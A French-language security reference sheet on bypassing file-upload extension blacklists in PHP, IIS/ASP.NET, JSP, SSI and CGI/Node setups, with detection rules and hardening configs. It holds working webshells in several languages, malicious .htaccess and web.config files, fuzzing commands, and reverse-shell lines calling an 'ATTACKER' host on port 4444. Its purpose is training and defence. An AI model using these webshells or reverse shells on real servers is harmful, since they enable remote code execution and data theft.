---
title: "Contournement des filtres d'extensions (Listes noires & Handlers du serveur web)"
description: "Fiche exhaustive sur le contournement des listes noires d'upload via les extensions alternatives exécutables (PHP, ASP.NET/IIS, Java/JSP, SSI, Node.js/Python)."
tags:
  - file-upload
  - bypass
  - web-security
  - iis
  - apache
  - nginx
  - rce
  - php
  - aspnet
  - jsp
  - ssi
  - blacklist
---

# Contournement des filtres d'extensions (Listes noires & Handlers du serveur web)

!!! warning "Cadre légal"
    Les techniques présentées sont à des fins de recherche en sécurité offensive et défensive exclusivement. Leur application sans autorisation écrite préalable du propriétaire du système cible constitue une infraction pénale.

---

## 1. Résumé Exécutif & Contexte

### Pourquoi les listes noires d'extensions échouent

Le filtrage par **liste noire** (*blacklist*) postule qu'il est possible d'énumérer exhaustivement l'ensemble des extensions dangereuses. Cette hypothèse est structurellement fausse pour trois raisons cumulatives :

1. **Diversité des handlers** : Chaque serveur web (Apache, Nginx, IIS, Tomcat), chaque version, chaque module installé peut reconnaître un jeu différent d'extensions comme exécutables — aucune liste ne couvre tous les contextes.
2. **Évolution continue** : De nouvelles extensions sont ajoutées par les mises à jour de serveurs, les modules tiers ou les configurations locales. Une liste figée devient obsolète.
3. **Asymétrie attaquant/défenseur** : L'attaquant n'a besoin de trouver qu'**une** extension oubliée parmi des dizaines possibles. Le défenseur doit les avoir toutes anticipées correctement.

!!! danger "Anti-pattern fondamental de sécurité"
    Une liste noire d'extensions n'est pas une mesure de sécurité — c'est une illusion de sécurité. La seule approche correcte est la **liste blanche stricte** (*whitelist*) : tout ce qui n'est pas explicitement autorisé est rejeté par défaut.

### Impact : de l'upload arbitraire à la RCE

```
Upload d'un fichier avec extension alternative
            ↓
Accès HTTP direct au fichier uploadé
            ↓
Le handler serveur interprète le fichier comme un script
            ↓
Exécution de code sous l'identité du processus web
            ↓
RCE → Lecture de fichiers sensibles → Pivot → Persistance
```

| Impact | Description |
| --- | --- |
| **RCE** | Exécution de commandes système arbitraires sous l'identité du processus web |
| **Lecture de secrets** | `/etc/passwd`, variables d'environnement, clés SSH, fichiers de config DB |
| **Pivot réseau** | Point d'accès vers le réseau interne non exposé directement |
| **Persistance** | Dépôt de backdoors, cron jobs, reverse shells permanents |
| **Escalade de privilèges** | Point de départ vers une élévation si SUID exploitable ou mauvaise config sudo |

---

## 2. Mécanisme & Fonctionnement Interne

### 2.1 Apache HTTPd — `mod_mime`, `AddHandler`, `SetHandler`

Quand Apache reçoit une requête pour un fichier, il résout le handler à appliquer via une chaîne de priorité :

```
Requête : GET /uploads/shell.phtml
         ↓
1. Correspondance du nom de fichier via <FilesMatch> ou <Files>
2. Extension résolue via AddType / AddHandler (mod_mime)
3. Handler sélectionné → transmission à l'interpréteur
         ↓
mod_php / php-fpm exécute le fichier
```

```apache
# Directive AddHandler — associe des extensions à un handler PHP
# La liste d'extensions est exhaustive dans la config d'origine,
# mais des configs incomplètes oublient régulièrement des alternatives
AddHandler application/x-httpd-php .php .phtml .pht .php3 .php4 .php5

# Directive SetHandler via FilesMatch
<FilesMatch "\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
# Vulnérabilité : regex sans ancre correcte
# "\.php" matche n'importe où dans le nom → shell.php.jpg est exécuté
# "\.php$" est correct — ancre de fin obligatoire

# Comportement multi-extension d'Apache
# Apache lit les extensions de droite à gauche :
# shell.php.unknownext → .unknownext non reconnu → remonte sur .php → exécuté
```

```apache
# .htaccess — vecteur autonome si AllowOverride != None dans le répertoire d'upload
# Upload d'un .htaccess malveillant permettant de redéfinir les handlers
AddType application/x-httpd-php .jpg .png .gif
# → Tous les fichiers image du répertoire sont désormais interprétés comme PHP
```

!!! danger "AllowOverride All sur le répertoire d'upload"
    Si `AllowOverride All` est actif pour le répertoire d'upload, l'upload d'un `.htaccess` seul constitue un vecteur de RCE complet — indépendamment de tout filtrage d'extension.

### 2.2 Nginx — PHP-FPM, FastCGI, blocs `location`

```nginx
# Configuration standard Nginx + PHP-FPM
server {
    # Bloc global PHP : ne couvre que les fichiers .php
    location ~ \.php$ {
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include        fastcgi_params;
    }

    # Bloc spécifique uploads : pas de fastcgi_pass → pas d'exécution PHP
    location /uploads/ {
        # Si ce bloc est ABSENT, le bloc ~ \.php$ global s'applique
        # aux fichiers .php du répertoire uploads → exécution possible
    }
}
```

```nginx
# Configuration vulnérable : regex élargie incluant des extensions alternatives
location ~ \.(php|phtml|php5|php7|phar)$ {
    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
# → Toutes les extensions listées sont exécutées comme PHP
```

!!! note "Vulnérabilité PATH_INFO (Nginx + cgi.fix_pathinfo)"
    Si `cgi.fix_pathinfo=1` dans `php.ini`, une requête vers `image.jpg/x.php` peut conduire PHP-FPM à exécuter `image.jpg` comme PHP, car FPM interprète `/x.php` comme `PATH_INFO` et remonte au fichier précédent. Désactiver `cgi.fix_pathinfo` en production.

### 2.3 IIS / ASP.NET — ISAPI Filters, HTTP Handlers, `web.config`

```xml
<!-- web.config — Configuration des handlers ASP.NET sous IIS -->
<!-- Par défaut, les extensions .aspx, .ashx, .asmx etc. sont mappées au moteur ASP.NET -->
<configuration>
  <system.webServer>
    <handlers>
      <!-- Handler explicite pour .aspx -->
      <add name="PageHandlerFactory-ISAPI-4.0_32bit"
           path="*.aspx"
           verb="GET,HEAD,POST,DEBUG"
           modules="IsapiModule"
           scriptProcessor="C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll"
           resourceType="Unspecified" />

      <!-- Handler couvrant également .ashx (Generic Handlers) et .asmx (Web Services) -->
      <add name="svc-ISAPI-4.0_32bit"
           path="*.ashx"
           verb="GET,HEAD,POST,DEBUG"
           modules="IsapiModule" />
    </handlers>
  </system.webServer>
</configuration>
```

```xml
<!-- web.config malveillant uploadé dans un répertoire -->
<!-- Redirige une extension arbitraire vers le moteur ASP.NET -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script">
      <add name="evil_handler"
           path="*.jpg"
           verb="*"
           type="System.Web.UI.PageHandlerFactory"
           resourceType="Unspecified"
           requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
<!-- → Tous les fichiers .jpg du répertoire sont exécutés comme ASP.NET -->
```

!!! warning "Interprétation par IIS des extensions méconnues"
    Sous IIS, les extensions `.cer`, `.asa`, `.cdx`, `.soap` peuvent être mappées au moteur ASP classique selon la version et la configuration du serveur. Vérifier le mapping ISAPI complet via `%windir%\system32\inetsrv\config\applicationHost.config`.

---

## 3. Empreinte & Détection

### 3.1 Stratégies de Fuzzing Red Team

#### Construction de la wordlist d'extensions

```text
# Wordlist complète multi-écosystème pour Burp Intruder / ffuf
# PHP
php
php3
php4
php5
php7
php8
phtml
pht
phar
phps
inc
# ASP/ASP.NET / IIS
asp
aspx
ashx
asmx
cer
asa
cdx
soap
config
# JSP / Java
jsp
jspx
jsw
jsv
jspf
# SSI
shtml
shtm
stm
# CGI / Scripts
cgi
pl
py
rb
# Variantes de casse
PHP
PhP
pHp
PHTML
pHtMl
ASPX
ASP
JSP
# Double extensions
php.jpg
aspx.jpg
jsp.jpg
php.unknownext
```

#### Fuzzing avec ffuf ou Burp Intruder

```bash
# Test d'upload avec fuzzing de l'extension — adapter le body multipart selon la cible
ffuf \
  -u https://cible.com/upload \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=FUZZBOUND" \
  -d $'--FUZZBOUND\r\nContent-Disposition: form-data; name="file"; filename="shell.FUZZ"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET[cmd]); ?>\r\n--FUZZBOUND--' \
  -w extensions_all.txt \
  -mc 200 \
  -fr "not allowed|invalid|forbidden" \
  -o results.json
```

```http
POST /upload.php HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.§EXT§"
Content-Type: image/jpeg

[payload selon l'écosystème]
------WebKitFormBoundary--
```

#### Vérification d'exécution post-upload

```bash
# PHP — test de base
curl "https://cible.com/uploads/shell.phtml?cmd=id"

# ASP.NET — adaptateur différent (pas de $_GET)
curl "https://cible.com/uploads/shell.ashx?cmd=whoami"

# JSP — paramètre adapté
curl "https://cible.com/uploads/shell.jspx?cmd=id"

# SSI — pas de paramètre dynamique, exec dans le fichier lui-même
curl "https://cible.com/uploads/shell.shtml"
```

### 3.2 Signatures Blue Team

```bash
# Détection dans les logs d'accès web Apache/Nginx
grep -iE "\.(phtml|php[3-9]?|pht|phar|phps|ashx|asmx|asa|cer|cdx|jsp[xfvw]?|shtml|shtm|stm)\s" \
    /var/log/apache2/access.log

# Filtrer les 200 sur des extensions non images dans le répertoire uploads
awk '$7 ~ /\/uploads\// && $9 == 200' /var/log/nginx/access.log | \
    grep -iE "\.(php|phtml|asp|aspx|jsp|shtml|cgi|py|pl)"
```

```bash
# Audit des fichiers uploadés aux extensions suspectes
find /var/www/html/uploads /var/www/html/media -type f \
    -iregex ".*\.\(php[0-9]?\|phtml\|pht\|phar\|phps\|asp[x]?\|ashx\|asmx\|jsp[xfv]?\|shtml\|shtm\|cgi\|py\|pl\)" \
    -ls 2>/dev/null
```

```yara
// Règle YARA — détection de webshells PHP dans des extensions alternatives
rule Webshell_PHP_Alternative_Extension {
    meta:
        description = "Webshell PHP avec extension non standard"
        severity    = "CRITICAL"

    strings:
        $php_open = "<?php" ascii nocase
        $sys1 = "system(" ascii nocase
        $sys2 = "exec(" ascii nocase
        $sys3 = "shell_exec(" ascii nocase
        $sys4 = "passthru(" ascii nocase
        $sys5 = "proc_open(" ascii nocase
        $sys6 = "popen(" ascii nocase
        $get1 = "$_GET["  ascii
        $get2 = "$_POST[" ascii
        $get3 = "$_REQUEST[" ascii

    condition:
        $php_open and (1 of ($sys*)) and (1 of ($get*))
}

// Règle YARA — webshell JSP
rule Webshell_JSP_Upload {
    meta:
        description = "Webshell JSP uploadé dans un répertoire de fichiers"

    strings:
        $jsp_tag  = "<%"   ascii
        $runtime  = "Runtime.getRuntime().exec(" ascii
        $process  = "ProcessBuilder" ascii
        $getparam = "request.getParameter(" ascii

    condition:
        $jsp_tag and (($runtime or $process) and $getparam)
}
```

```yaml
# Règle Suricata — accès réseau à des extensions alternatives
alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"ET WEB_SERVER Alternative Executable Extension Access in Upload Directory";
    flow:established,to_server;
    http.uri;
    pcre:"/\/uploads\/.*\.(phtml|php[3-9]?|pht|phar|ashx|asmx|cer|asa|jsp[xfv]?|shtml|stm|cgi|py)/iU";
    classtype:web-application-attack;
    sid:9000010; rev:1;
)
```

---

## 4. Méthodologie d'Exploitation par Écosystème

### Variante 1 : Écosystème PHP

#### Inventaire exhaustif des extensions interprétées

| Extension | Contexte d'interprétation |
| --- | --- |
| `.php` | Toujours filtré — extension principale |
| `.php3` | PHP 3 (1997), encore reconnue par `mod_php` et certaines configs |
| `.php4` | PHP 4, idem |
| `.php5` | PHP 5, présente dans les configs Ubuntu/Debian historiques |
| `.php7` | PHP 7, parfois dans les configs récentes (dépend de la distrib) |
| `.phtml` | *PHP HTML* — template PHP, souvent oubliée des listes noires |
| `.pht` | Extension courte, reconnue par certaines configs Apache |
| `.phar` | *PHP Archive* — format de packaging exécuté nativement par PHP |
| `.phps` | Coloration syntaxique PHP (peut exécuter selon config) |
| `.inc` | Fichier d'inclusion PHP, interprété si `AddHandler` couvre `*` ou `.inc` |

#### Payload PHP minimaliste et requête HTTP

```php
<?php
// Webshell PHP minimaliste
// Compatible avec toutes les versions PHP >= 4
if (isset($_GET['c'])) {
    system(base64_decode($_GET['c']));
}
?>
```

```http
POST /upload.php HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----FormBoundary7MA4YWx

------FormBoundary7MA4YWx
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------FormBoundary7MA4YWx--
```

```bash
# Exécution après upload réussi
curl "https://cible.com/uploads/shell.phtml?cmd=id"
# → uid=33(www-data) gid=33(www-data)

# Lancement d'un reverse shell
curl "https://cible.com/uploads/shell.phtml?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261'"
```

#### Exploitation du format PHAR

```php
<?php
// Génération d'un PHAR malveillant côté attaquant
// Nécessite phar.readonly = 0 dans php.ini
$phar = new Phar('evil.phar');
$phar->startBuffering();

// Le stub est exécuté lors d'un accès HTTP direct au .phar
$phar->setStub('<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>');

// Fichiers leurres pour imiter une archive légitime
$phar->addFromString('readme.txt', 'Documentation interne');
$phar->stopBuffering();
?>
```

```bash
# Génération du PHAR en ligne de commande
php -d phar.readonly=0 create_phar.php

# Upload et accès HTTP direct (si le serveur interprète .phar comme PHP)
curl "https://cible.com/uploads/evil.phar?cmd=whoami"
```

---

### Variante 2 : Écosystème ASP.NET / IIS

#### Inventaire des extensions IIS/ASP.NET exécutables

| Extension | Interpréteur / Moteur |
| --- | --- |
| `.asp` | ASP classique (VBScript/JScript) via `asp.dll` |
| `.aspx` | ASP.NET WebForms via le moteur ASP.NET |
| `.ashx` | Generic HTTP Handler ASP.NET — exécuté directement par le runtime |
| `.asmx` | ASP.NET Web Services — exécuté par le runtime ASP.NET |
| `.cer` | Peut être mappé au moteur ASP classique selon la config IIS |
| `.asa` | Application file ASP — exécuté par ASP classique sur certaines configs |
| `.cdx` | Channel Definition File — historiquement mappé à ASP sur IIS 5/6 |
| `.soap` | SOAP endpoint — mappé au moteur ASP.NET sur certaines versions |
| `.config` | Si `runAllManagedModulesForAllRequests=true`, peut être traité par ASP.NET |

#### Payload ASP classique (`.asp`, `.cer`, `.asa`)

```asp
<%
' Webshell ASP classique (VBScript)
' Compatible IIS 5/6/7 avec ASP activé
Dim cmd, shell, result
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set shell = CreateObject("WScript.Shell")
    Set result = shell.Exec("cmd.exe /c " & cmd)
    Response.Write "<pre>" & Server.HTMLEncode(result.StdOut.ReadAll()) & "</pre>"
End If
%>
```

```http
POST /upload.aspx HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="file"; filename="shell.cer"
Content-Type: application/octet-stream

<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Dim shell : Set shell = CreateObject("WScript.Shell")
    Dim exec  : Set exec  = shell.Exec("cmd.exe /c " & cmd)
    Response.Write exec.StdOut.ReadAll()
End If
%>
------FormBoundary--
```

```bash
# Test d'exécution sous IIS
curl "https://cible.com/uploads/shell.cer?cmd=whoami"
# → iis apppool\myapp  ou  nt authority\network service
```

#### Payload ASHX (Generic HTTP Handler ASP.NET)

```csharp
// webshell.ashx — Generic Handler ASP.NET
// Compilé à la volée par le runtime ASP.NET — aucune compilation préalable requise
<%@ WebHandler Language="C#" Class="Handler" %>
using System;
using System.Web;
using System.Diagnostics;

public class Handler : IHttpHandler {
    public void ProcessRequest(HttpContext ctx) {
        string cmd = ctx.Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            ctx.Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
    public bool IsReusable { get { return false; } }
}
```

```bash
curl "https://cible.com/uploads/shell.ashx?cmd=whoami"
```

---

### Variante 3 : Écosystème Java / JSP

#### Inventaire des extensions JSP interprétées

| Extension | Contexte |
| --- | --- |
| `.jsp` | JavaServer Pages — standard, toujours filtrée |
| `.jspx` | JSP en syntaxe XML — reconnue par Tomcat, Jetty, WebLogic |
| `.jspf` | JSP Fragment — inclus dans d'autres JSP, mais peut être accédé directement |
| `.jsw` | JSP Wrapper — spécifique à certaines configurations WebLogic |
| `.jsv` | Variante JSP — reconnue par certains serveurs d'application |

#### Payload JSP minimaliste

```jsp
<%-- Webshell JSP minimaliste --%>
<%@ page import="java.io.*,java.util.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        String[] commands = {"/bin/bash", "-c", cmd};
        Process proc = Runtime.getRuntime().exec(commands);
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(proc.getInputStream())
        );
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        out.println("<pre>" + output.toString() + "</pre>");
    }
%>
```

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jspx"
Content-Type: image/jpeg

<%@ page import="java.io.*" %>
<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
   out.print(new String(p.getInputStream().readAllBytes())); %>
------FormBoundary--
```

```bash
# Test sur Tomcat
curl "https://cible.com/uploads/shell.jspx?cmd=id"

# Avec Burp — adapter le Content-Type si un filtre vérifie le MIME
# application/octet-stream ou image/jpeg selon le filtre côté serveur
```

!!! tip "Spécificités Tomcat vs WebLogic"
    **Tomcat** interprète nativement `.jsp` et `.jspx`. Les extensions `.jspf`, `.jsw`, `.jsv` peuvent nécessiter une configuration `web.xml` spécifique ou sont reconnues uniquement sur certaines versions. **WebLogic** et **WebSphere** ont leurs propres mappings, parfois plus larges.

---

### Variante 4 : HTML / Server Side Includes (SSI)

#### Extensions SSI et mécanisme d'interprétation

Server Side Includes (SSI) est un mécanisme de templating côté serveur permettant d'inclure dynamiquement du contenu dans des fichiers HTML. Apache `mod_include` traite les directives SSI dans les fichiers dont l'extension est mappée au handler `server-parsed`.

```apache
# Configuration Apache activant SSI pour les extensions .shtml et .shtm
AddType text/html .shtml .shtm .stm
AddOutputFilter INCLUDES .shtml .shtm .stm
# Si cette directive couvre des répertoires d'upload → RCE via SSI
```

#### Payload SSI malveillant

```html
<!-- shell.shtml — exécution de commande via directive SSI exec -->
<!--#exec cmd="id" -->

<!-- Reverse shell via SSI -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" -->

<!-- Lecture de fichiers sensibles -->
<!--#include virtual="/etc/passwd" -->
<!--#exec cmd="cat /etc/shadow" -->
```

```http
POST /upload.php HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="file"; filename="shell.shtml"
Content-Type: text/html

<html><body>
<!--#exec cmd="id" -->
</body></html>
------FormBoundary--
```

```bash
# Accès au fichier — le serveur interprète les directives SSI avant de répondre
curl "https://cible.com/uploads/shell.shtml"
# → <html><body>uid=33(www-data) gid=33(www-data)</body></html>
```

!!! warning "SSI souvent oubliée des audits"
    SSI est une technologie ancienne (années 1990) mais encore présente sur de nombreux sites legacy et CMS anciens. L'extension `.shtml` est rarement incluse dans les listes noires modernes, pourtant `<!--#exec cmd="...">` offre une RCE directe si `mod_include` est activé et que l'extension n'est pas isolée.

---

### Variante 5 : Node.js & Python via CGI / Custom Handlers

#### Python via Apache `mod_cgi`

```apache
# Configuration Apache activant CGI pour les scripts Python
ScriptAlias /cgi-bin/ /var/www/cgi-bin/
<Directory "/var/www/cgi-bin">
    Options +ExecCGI
    AddHandler cgi-script .py .cgi .pl
</Directory>
# Si le répertoire d'upload est inclus dans ce périmètre → exécution Python possible
```

```python
#!/usr/bin/env python3
# shell.py — webshell Python via CGI
# Nécessite un shebang valide et les droits d'exécution (chmod +x)
import os
import cgi

print("Content-Type: text/html\n")

form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "")
if cmd:
    output = os.popen(cmd).read()
    print(f"<pre>{output}</pre>")
```

```bash
# Upload de shell.py dans un répertoire CGI-enabled
# Le fichier doit être exécutable côté serveur
curl "https://cible.com/cgi-bin/shell.py?cmd=id"
```

#### Node.js via reverse proxy mal isolé

```javascript
// shell.js — script Node.js exposé via un reverse proxy configuré sans restriction
// Scénario : Nginx proxifie /app/ vers un serveur Express local
// et une erreur de configuration permet d'atteindre des fichiers uploadés
const express = require('express');
const { exec } = require('child_process');
const app = express();

// Endpoint webshell dans un fichier uploadé et exécuté par le runtime Node
app.get('/shell', (req, res) => {
    const cmd = req.query.cmd || 'id';
    exec(cmd, (err, stdout, stderr) => {
        res.send(`<pre>${stdout || stderr}</pre>`);
    });
});

app.listen(3001);
```

```nginx
# Configuration Nginx vulnérable — le bloc /uploads/ passe par le proxy Node
server {
    location /uploads/ {
        # Mauvaise configuration : les .js uploadés sont proxifiés vers Node
        proxy_pass http://127.0.0.1:3001/;
        # Correct serait : try_files $uri =404; sans proxy_pass pour ce répertoire
    }
}
```

!!! note "CGI vs Reverse Proxy — deux surfaces distinctes"
    L'exécution de scripts Python ou Node.js via un fichier uploadé nécessite l'une ou l'autre des deux conditions : (1) le répertoire d'upload est dans le périmètre d'un `ScriptAlias` CGI avec l'extension concernée mappée, ou (2) un reverse proxy redirige les requêtes vers un runtime qui traite les fichiers uploadés. Ces deux cas résultent de mauvaises configurations d'infrastructure plutôt que d'un défaut applicatif au sens strict.

---

## 5. Remédiation & Hardening

### 5.1 Liste blanche stricte — Whitelisting

```php
<?php
// ❌ Anti-pattern — liste noire incomplète et contournable
$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml', 'asp', 'aspx', 'jsp'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (in_array($ext, $blacklist)) {
    die("Extension interdite.");
}
// Oublie .php7, .phar, .pht, .ashx, .jspx, .shtml, .cer, variantes de casse...

// ✅ Bonne pratique — liste blanche stricte
$whitelist = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf', 'txt', 'zip'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $whitelist, true)) {
    die("Type de fichier non autorisé.");
}

// ✅ Double vérification extension + MIME type réel (via finfo)
$whitelist_ext  = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$whitelist_mime = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
$ext  = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($_FILES['file']['tmp_name']);
if (!in_array($ext, $whitelist_ext, true) || !in_array($mime, $whitelist_mime, true)) {
    die("Fichier non autorisé.");
}
?>
```

### 5.2 Renommage aléatoire sans conserver l'extension d'origine

```php
<?php
// ✅ Renommer le fichier avec un UUID aléatoire et une extension fixée en whitelist
$stored_ext = 'jpg'; // Extension forcée, indépendante de ce que l'utilisateur envoie
$stored_name = bin2hex(random_bytes(16)) . '.' . $stored_ext;
$upload_path = '/var/www/storage/uploads/' . $stored_name;

if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
    // Stocker la correspondance original → stocké en base de données
    // L'attaquant ne peut pas connaître le chemin généré aléatoirement
    db_save(['original' => $_FILES['file']['name'], 'stored' => $stored_name]);
}
?>
```

### 5.3 Isolation du répertoire d'upload — Désactivation de l'exécution

```apache
# Apache — Désactiver toute exécution dans le répertoire d'upload
<Directory "/var/www/html/uploads">
    # Désactive l'interpréteur PHP
    php_flag engine off

    # Désactive CGI
    Options -ExecCGI

    # Interdit la lecture des .htaccess (empêche l'upload d'un .htaccess malveillant)
    AllowOverride None

    # Force le type MIME à octet-stream pour TOUS les fichiers du répertoire
    # → Le navigateur télécharge le fichier, il n'est jamais exécuté
    ForceType application/octet-stream
</Directory>
```

```nginx
# Nginx — Désactiver PHP-FPM et forcer le téléchargement pour le répertoire d'upload
location /uploads/ {
    # Ne pas inclure de fastcgi_pass ici
    # Le bloc location /uploads/ est plus spécifique que location ~ \.php$
    # → prend la priorité → pas d'exécution PHP

    # Forcer le téléchargement
    add_header Content-Type application/octet-stream;
    add_header Content-Disposition "attachment";

    # Refuser explicitement les extensions exécutables
    location ~* \.(php[0-9]?|phtml|pht|phar|asp[x]?|ashx|jsp[xfv]?|shtml|py|pl|cgi)$ {
        deny all;
        return 403;
    }
}
```

```xml
<!-- IIS — web.config pour désactiver l'exécution dans le répertoire d'upload -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- Supprimer tous les handlers dynamiques du répertoire d'upload -->
    <handlers>
      <clear />
      <!-- Ne conserver que le handler de fichiers statiques -->
      <add name="StaticFile"
           path="*"
           verb="*"
           modules="StaticFileModule"
           resourceType="File" />
    </handlers>
    <!-- Forcer les fichiers uploadés à être servis en téléchargement -->
    <staticContent>
      <mimeMap fileExtension=".*" mimeType="application/octet-stream" />
    </staticContent>
  </system.webServer>
</configuration>
```

### 5.4 Architecture défensive complémentaire

| Mesure | Impact |
| --- | --- |
| **Stockage hors webroot** | Fichiers dans `/var/storage/` (hors `/var/www/html/`) — aucun accès HTTP direct possible, servis uniquement via un contrôleur applicatif |
| **Domaine d'upload séparé** | `cdn.cible.com` ou `uploads.cible.com` — si un script est exécuté, pas d'accès aux cookies de `cible.com` (Same-Origin Policy) |
| **Scan antivirus à l'upload** | Intégration de ClamAV, Windows Defender API, ou service cloud de scan avant stockage |
| **Journalisation & alerting** | Alerte sur tout HTTP 200 vers le répertoire d'upload pour une extension non image — cf. règles Suricata et logs Apache/Nginx §3.2 |
| **inotifywait en production** | Surveillance temps réel des dépôts de fichiers aux extensions suspectes dans le répertoire d'upload |
| **Content Security Policy** | Limite l'impact d'un XSS via fichier uploadé mais ne protège pas contre l'exécution serveur directe |

---

## 6. Références & Cheat Sheets

### Ressources offensives

- **PayloadsAllTheThings — File Upload Bypass** :
  `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files`
  — Wordlists d'extensions, payloads webshells par écosystème, contournements `.htaccess` et `web.config`

- **HackTricks — File Upload** :
  `https://book.hacktricks.xyz/pentesting-web/file-upload`

- **PortSwigger Web Security Academy — File Upload Vulnerabilities** :
  `https://portswigger.net/web-security/file-upload`
  — Labs pratiques couvrant les extensions alternatives, double extensions, `.htaccess`, `web.config`

- **GitHub — tennc/webshell** :
  `https://github.com/tennc/webshell`
  — Collection de référence de webshells multi-langages (PHP, ASP, JSP, Python, Perl)

### Documentation officielle serveurs

- **Apache — mod_mime** : `https://httpd.apache.org/docs/current/mod/mod_mime.html`
- **Apache — mod_include (SSI)** : `https://httpd.apache.org/docs/current/mod/mod_include.html`
- **Nginx — Directives location** : `https://nginx.org/en/docs/http/ngx_http_core_module.html#location`
- **IIS — HTTP Handlers** : `https://docs.microsoft.com/en-us/iis/configuration/system.webserver/handlers/`
- **Tomcat — JSP Configuration** : `https://tomcat.apache.org/tomcat-10.1-doc/config/context.html`
- **PHP — Phar format** : `https://www.php.net/manual/en/phar.using.intro.php`

### Cheat Sheet rapide — Extensions par écosystème

```text
PHP    : php, php3, php4, php5, php7, phtml, pht, phar, phps, inc
IIS    : asp, aspx, ashx, asmx, cer, asa, cdx, soap
JSP    : jsp, jspx, jsw, jsv, jspf
SSI    : shtml, shtm, stm
CGI    : cgi, pl, py, rb, sh
Casse  : PHP, PhP, pHp, PHTML, ASPX, JSP, phP7
Double : php.jpg, aspx.jpg, php.unknownext
```
